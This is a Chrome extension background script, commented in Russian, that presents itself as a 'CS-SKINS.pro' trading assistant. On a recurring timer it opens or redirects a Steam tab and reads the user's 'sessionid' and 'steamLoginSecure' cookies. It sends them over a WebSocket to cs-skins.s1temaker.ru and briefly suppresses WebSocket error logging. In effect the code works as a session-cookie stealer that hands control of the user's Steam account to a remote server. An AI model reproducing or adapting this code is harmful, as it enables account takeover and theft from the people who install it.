class TradingAssistant {
    constructor() {
        this.isActive = false;
        this.isAuthorized = false;
        this.wsConnection = null;
        this.storageKey = 'cs2_marketplace_extension';
        this.isCheckingSteam = false; // Флаг для предотвращения одновременных проверок
        
        this.init();
    }
    
    async storage(action, data = null) {
        try {
            const result = await chrome.storage.local.get(this.storageKey);
            const current = result[this.storageKey] || {};
            
            switch (action) {
                case 'get': return current;
                case 'set': 
                    await chrome.storage.local.set({ [this.storageKey]: { ...current, ...data } });
                    break;
                case 'clear':
                    await chrome.storage.local.set({ [this.storageKey]: { authToken: null, websocketChannel: null, userInfo: null } });
                    break;
                case 'isAuth': return !!current.authToken;
            }
        } catch (error) {
            return action === 'get' ? {} : null;
        }
    }
    
    
    async init() {
        this.isAuthorized = await this.storage('isAuth');
        if (this.isAuthorized) {
            await this.connectWebSocket();
            chrome.alarms.create('statusCheck', { periodInMinutes: 0.4 }); // 24 секунды
        }
        await updateActivityIcon();
    }
    
    async checkStatusWebsocket() {
        // Предотвращаем одновременные проверки
        if (this.isCheckingSteam) return;
        this.isCheckingSteam = true;
        
        try {
            const data = await this.storage('get');
            const previousOverallStatus = data.overallStatus || 'inactive';
            
            // Получаем валидную Steam сессию
            const session = await this.getValidSteamSession();
            
            if (session) {
                // Отправляем сессию на сервер
                await this.sendToServer('session_data', {
                    session: session,
                    timestamp: new Date().toISOString()
                });
                
                // Статус станет 'active' только когда сервер ответит session_received
                // Пока ставим 'pending' - ждем ответа от сервера
                await this.storage('set', { 
                    overallStatus: 'pending',
                    steamStatus: 'ok',
                    lastSessionSent: new Date().toISOString()
                });
            } else {
                // Нет Steam сессии - сразу inactive
                await this.storage('set', { 
                    overallStatus: 'inactive',
                    steamStatus: 'no_auth'
                });
            }
            
            // Обновляем индикатор только если общий статус изменился
            const newData = await this.storage('get');
            if (previousOverallStatus !== newData.overallStatus) {
                await updateActivityIcon();
            }
            
        } catch (error) {
            await this.storage('set', { 
                overallStatus: 'inactive',
                steamStatus: 'error'
            });
            
            const errorData = await this.storage('get');
            if (errorData.overallStatus !== 'inactive') {
                await updateActivityIcon();
            }
        } finally {
            this.isCheckingSteam = false;
        }
    }
    
    async getSteamSession(tabId) {
        try {
            // Сначала получаем данные из content script
            const contentScriptData = await new Promise((resolve) => {
                chrome.tabs.sendMessage(tabId, { type: 'GET_STEAM_SESSION' }, (response) => {
                    resolve(chrome.runtime.lastError ? null : response);
                });
            });
            
            if (!contentScriptData) {
                return null;
            }
            
            // Теперь получаем cookies через Chrome API (как в v1)
            const cookies = await this.getSteamCookies();
            
            // Объединяем данные
            return {
                ...contentScriptData,
                steamLoginSecure: cookies.steamLoginSecure || null
            };
            
        } catch (error) {
            return null;
        }
    }
    
    /**
     * Получение куки Steam из браузера (из v1)
     */
    async getSteamCookies() {
        try {
            const sessionIdCookie = await chrome.cookies.get({
                url: 'https://steamcommunity.com',
                name: 'sessionid'
            });
            
            const steamLoginSecureCookie = await chrome.cookies.get({
                url: 'https://steamcommunity.com',
                name: 'steamLoginSecure'
            });
            
            return {
                sessionid: sessionIdCookie?.value || null,
                steamLoginSecure: steamLoginSecureCookie?.value || null
            };
        } catch (error) {
            return {};
        }
    }
    
    async getValidSteamSession() {
        try {
            const data = await this.storage('get');
            const expectedSteamId = data.userInfo?.steam_id;
            
            if (!expectedSteamId) {
                return null;
            }
            
            // Ищем первую Steam вкладку (любую)
            const steamTabs = await chrome.tabs.query({ url: ["*://steamcommunity.com/*"] });
            let targetTab;
            
            if (steamTabs.length > 0) {
                // Используем первую найденную Steam вкладку
                targetTab = steamTabs[0];
                // Всегда обновляем страницу для получения актуальных данных
                await chrome.tabs.update(targetTab.id, { 
                    url: `https://steamcommunity.com/profiles/${expectedSteamId}/edit/info` 
                });
            } else {
                // Создаем новую вкладку если Steam вкладок нет
                targetTab = await chrome.tabs.create({ 
                    url: `https://steamcommunity.com/profiles/${expectedSteamId}/edit/info`, 
                    active: false 
                });
            }
            
            // Ждем полной загрузки страницы
            await new Promise((resolve) => {
                let timeoutId;
                
                const listener = function(tabId, info) {
                    if (tabId === targetTab.id && info.status === 'complete') {
                        chrome.tabs.onUpdated.removeListener(listener);
                        if (timeoutId) clearTimeout(timeoutId);
                        setTimeout(resolve, 2000); // Даем время на возможные редиректы
                    }
                };
                
                chrome.tabs.onUpdated.addListener(listener);
                
                // Таймаут на случай если загрузка зависнет
                timeoutId = setTimeout(() => {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve();
                }, 10000); // 10 секунд максимум ждем
            });
            
            // Проверяем финальный URL
            const finalTab = await chrome.tabs.get(targetTab.id);
            
            if (finalTab.url.includes('/login/')) {
                // Перенаправило на страницу входа - не авторизован
                return null;
            }
            
            // Получаем данные сессии из вкладки
            const session = await this.getSteamSession(targetTab.id);
            
            if (!session?.sessionid) {
                return null;
            }
            
            // Извлекаем Steam ID из финального URL после всех редиректов
            const steamIdMatch = finalTab.url.match(/steamcommunity\.com\/profiles\/(\d+)/);
            const actualSteamId = steamIdMatch ? steamIdMatch[1] : session?.steamid;
            
            // Проверяем что это правильный аккаунт
            if (actualSteamId !== expectedSteamId) {
                return null;
            }
            
            return session;
            
        } catch (error) {
            return null;
        }
    }
    
    sendWS(event, data = {}) {
        if (this.wsConnection?.readyState === WebSocket.OPEN) {
            this.wsConnection.send(JSON.stringify({ event, data }));
        }
    }
    
    async connectWebSocket() {
        if (this.wsConnection) {
            this.wsConnection.close();
            this.wsConnection = null;
        }
        this.isActive = true;
        startKeepAlive();
        
        try {
            const data = await this.storage('get');
            if (!data.authToken) return;
            
            // Подавляем все сообщения об ошибках WebSocket
            const originalError = console.error;
            console.error = (...args) => {
                if (args[0] && args[0].toString().includes('WebSocket')) return;
                originalError.apply(console, args);
            };
            
            this.wsConnection = new WebSocket('wss://cs-skins.s1temaker.ru/ws/app/cs-skins-key?protocol=7&client=js&version=8.0.1&flash=false');
            
            // Восстанавливаем console.error через 100мс
            setTimeout(() => { console.error = originalError; }, 100);
            
            this.wsConnection.onopen = () => {
                // Подписываемся на канал
                if (data.websocketChannel) this.sendWS('pusher:subscribe', { channel: data.websocketChannel });
            };
            
            this.wsConnection.onmessage = async (event) => {
                try {
                    const { event: eventType, data: messageData } = JSON.parse(event.data);
                    const parsedData = typeof messageData === 'string' ? JSON.parse(messageData) : messageData;
                    await handleServerMessage(eventType, parsedData);
                } catch (error) {}
            };
            
            this.wsConnection.onclose = (event) => {
                if (event.code !== 1000 && this.isActive && this.isAuthorized) {
                    setTimeout(() => this.connectWebSocket(), 5000);
                }
            };
            
            this.wsConnection.onerror = () => {};
            
        } catch (error) {
            this.isActive = false;
        }
        
        await updateActivityIcon();
    }
    
    async stop() {
        if (this.wsConnection) {
            this.wsConnection.close();
            this.wsConnection = null;
        }
        chrome.alarms.clear('statusCheck');
        
        this.isActive = false;
        stopKeepAlive();
        await updateActivityIcon();
    }
    
    async authorize(token) {
        try {
            const response = await fetch('https://cs-skins.s1temaker.ru/api/ext-api/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token })
            });
            
            const data = await response.json();
            
            if (response.ok && data.success && data.channel) {
                await this.storage('set', { authToken: token, websocketChannel: data.channel });
                this.isAuthorized = true;
                await this.connectWebSocket();
                chrome.alarms.create('statusCheck', { periodInMinutes: 0.4 }); // 24 секунды
                await updateActivityIcon();
            } else {
                throw new Error(data.message || 'Authorization failed');
            }
        } catch (error) {
            throw error;
        }
    }
    
    async logout() {
        await this.stop();
        await this.storage('clear');
        this.isAuthorized = false;
        await updateActivityIcon();
    }
    
    async handleMessage(message, sender, sendResponse) {
        switch (message.type) {
            case 'AUTHORIZE':
                try {
                    // Проверяем, что данные уже сохранены в storage
                    const data = await this.storage('get');
                    if (data.authToken && data.websocketChannel) {
                        this.isAuthorized = true;
                        await this.connectWebSocket();
                        chrome.alarms.create('statusCheck', { periodInMinutes: 0.4 }); // 24 секунды
                        await updateActivityIcon();
                        sendResponse({ success: true });
                    } else {
                        // Если данных нет, выполняем полную авторизацию
                        await this.authorize(message.token);
                        sendResponse({ success: true });
                    }
                    
                    // Отправляем обновленный статус
                    const statusData = await this.storage('get');
                    chrome.runtime.sendMessage({
                        type: 'STATUS_UPDATE',
                        data: {
                            isRunning: this.isActive,
                            websocketConnected: this.wsConnection?.readyState === WebSocket.OPEN,
                            overallStatus: statusData.overallStatus || 'inactive',
                            steamStatus: statusData.steamStatus || 'no_auth'
                        }
                    }).catch(() => {});
                } catch (error) {
                    sendResponse({ success: false, error: error.message });
                }
                break;
                
            case 'LOGOUT':
                await this.logout();
                sendResponse({ success: true });
                break;
                
            case 'GET_STATUS':
                const data = await this.storage('get');
                sendResponse({
                    isRunning: this.isActive,
                    isAuthorized: this.isAuthorized,
                    overallStatus: data.overallStatus || 'inactive',
                    steamStatus: data.steamStatus || 'no_auth'
                });
                break;
                
            case 'RESIZE_WINDOW':
                // Изменяем размер текущего окна в зависимости от состояния авторизации
                if (sender.tab && sender.tab.windowId) {
                    const { width, height } = getWindowSize(message.isAuthorized);
                    chrome.windows.update(sender.tab.windowId, { width, height }).catch(() => {});
                }
                break;
        }
    }
    
    async sendToServer(type, data = {}) {
        if (this.wsConnection?.readyState !== WebSocket.OPEN) return false;
        
        try {
            const storageData = await this.storage('get');
            if (!storageData.websocketChannel) return false;
            
            const message = {
                event: 'client-message',
                data: { type, ...data },
                channel: storageData.websocketChannel
            };
            
            this.wsConnection.send(JSON.stringify(message));
            return true;
        } catch (error) {
            return false;
        }
    }
    
}

async function handleServerMessage(messageType, messageData) {
    if (['pusher:connection_established', 'pusher_internal:subscription_succeeded', 'pusher:error', 'pusher:ping', 'pusher:pong'].includes(messageType)) return;
    
    switch (messageType) {
        case 'session_received':
            // Сервер подтвердил получение сессии - все активно
            await assistant.storage('set', { 
                overallStatus: 'active',
                lastServerResponse: new Date().toISOString() 
            });
            await updateActivityIcon();
            break;
        case 'force_logout':
            await assistant.logout();
            chrome.runtime.sendMessage({ type: 'FORCE_LOGOUT', message: messageData?.message || 'Требуется переавторизация' }).catch(() => {});
            break;
    }
}

const assistant = new TradingAssistant();

async function updateActivityIcon() {
    const { isActive, isAuthorized } = assistant;
    
    if (!isAuthorized) {
        // Не авторизован
        chrome.action.setTitle({ title: 'CS-SKINS.pro - Не подключен' });
        chrome.action.setBadgeText({ text: '×' });
        chrome.action.setBadgeBackgroundColor({ color: '#888888' });
        return;
    }
    
    // Получаем общий статус
    const data = await assistant.storage('get');
    const overallStatus = data.overallStatus || 'inactive';
    
    switch (overallStatus) {
        case 'active':
            // Все работает - зеленый
            chrome.action.setTitle({ title: 'CS-SKINS.pro - Активен' });
            chrome.action.setBadgeText({ text: '●' });
            chrome.action.setBadgeBackgroundColor({ color: '#44ff44' });
            break;
        case 'pending':
            // Ждем ответа от сервера - желтый
            chrome.action.setTitle({ title: 'CS-SKINS.pro - Подключение...' });
            chrome.action.setBadgeText({ text: '◐' });
            chrome.action.setBadgeBackgroundColor({ color: '#ffaa00' });
            break;
        case 'inactive':
        default:
            // Проблемы - красный
            chrome.action.setTitle({ title: 'CS-SKINS.pro - Неактивен' });
            chrome.action.setBadgeText({ text: '○' });
            chrome.action.setBadgeBackgroundColor({ color: '#ff4444' });
            break;
    }
}

function startKeepAlive() {
    chrome.alarms.create('keepAlive', { periodInMinutes: 1 });
}

function stopKeepAlive() {
    chrome.alarms.clear('keepAlive');
}

chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'keepAlive') {
        // Просто поддерживаем активность Service Worker
    } else if (alarm.name === 'statusCheck') {
        // Проверяем статус и отправляем сессию только если авторизованы
        if (assistant.isAuthorized) {
            assistant.checkStatusWebsocket();
        }
    }
});
// Функция для расчета размеров окна
function getWindowSize(isAuthorized) {
    // Получаем размеры контента из CSS переменных
    const contentWidth = 350;
    const borderWidth = 16; // padding по бокам
    
    const compactHeight = 175;
    const expandedHeight = 450;
    const borderHeight = 40; // высота заголовка + отступы
    
    return {
        width: contentWidth + borderWidth,
        height: (isAuthorized ? compactHeight : expandedHeight) + borderHeight
    };
}

// Сохраняем ID окна расширения
let extensionWindowId = null;

// Обработчик клика на иконку расширения
chrome.action.onClicked.addListener(async () => {
    // Проверяем, существует ли окно расширения
    if (extensionWindowId) {
        try {
            const window = await chrome.windows.get(extensionWindowId);
            // Если окно существует, фокусируем его
            await chrome.windows.update(extensionWindowId, { focused: true });
            return;
        } catch (error) {
            // Окно не существует, будем создавать новое
            extensionWindowId = null;
        }
    }
    
    const url = chrome.runtime.getURL('index.html');
    
    // Проверяем, авторизован ли пользователь
    const data = await assistant.storage('get');
    const isAuthorized = !!(data?.authToken && data?.websocketChannel);
    
    // Рассчитываем размер окна
    const { width, height } = getWindowSize(isAuthorized);
    
    const windowOptions = {
        url: url,
        type: 'popup',
        width: width,
        height: height,
        focused: true
    };
    
    const window = await chrome.windows.create(windowOptions);
    extensionWindowId = window.id;
});

// Слушаем закрытие окна
chrome.windows.onRemoved.addListener((windowId) => {
    if (windowId === extensionWindowId) {
        extensionWindowId = null;
    }
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => { assistant.handleMessage(message, sender, sendResponse); return true; });
chrome.runtime.onInstalled.addListener(() => assistant.init());
chrome.runtime.onStartup.addListener(() => assistant.init());